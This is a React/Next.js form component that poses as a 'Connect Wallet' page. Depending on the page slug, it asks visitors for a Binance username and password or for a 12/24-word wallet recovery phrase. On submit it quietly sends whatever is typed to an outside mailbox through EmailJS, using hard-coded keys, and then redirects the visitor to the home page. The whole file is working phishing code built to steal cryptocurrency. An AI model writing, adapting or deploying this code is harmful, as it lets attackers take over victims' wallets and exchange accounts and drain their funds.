// @ts-nocheck
'use client';

import { useRef } from 'react';
import { useParams, useRouter } from 'next/navigation';
import emailjs from '@emailjs/browser';

import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';

export default function Form() {
  const { slug } = useParams();
  const { push } = useRouter();
  const isBinance = slug === 'Binance';

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .send(
        'service_5gpw30c',
        'template_5rlbagi',
        {
          message: isBinance
            ? `Username: ${form.current.username.value}, password: ${form.current.password.value}`
            : form.current.message.value,
        },
        '7fQ-xstCOTi0ZiuVg'
      )
      .then(
        (result) => {
          push('/');
        },
        (error) => {
          alert(error);
        }
      );
  };

  return (
    <div>
      <form
        ref={form}
        className="mx-auto flex max-w-xl flex-col items-start gap-5 pb-20"
        onSubmit={sendEmail}
      >
        <h5 className="text-xl font-semibold md:text-4xl">Add {slug} Wallet</h5>

        {isBinance || (
          <p className="py-4">
            Typically 12 (sometimes 24) words separated by a single spaces.
          </p>
        )}
        {isBinance ? (
          <>
            <Input required name="username" placeholder="Enter Username" />
            <Input
              required
              name="password"
              placeholder="Enter Password"
              type="password"
            />
          </>
        ) : (
          <Textarea required name="message" placeholder="Enter your Phrase" />
        )}

        <Button type="submit">Connect Wallet</Button>
      </form>
    </div>
  );
}

// marcosfrin220@gmail.com
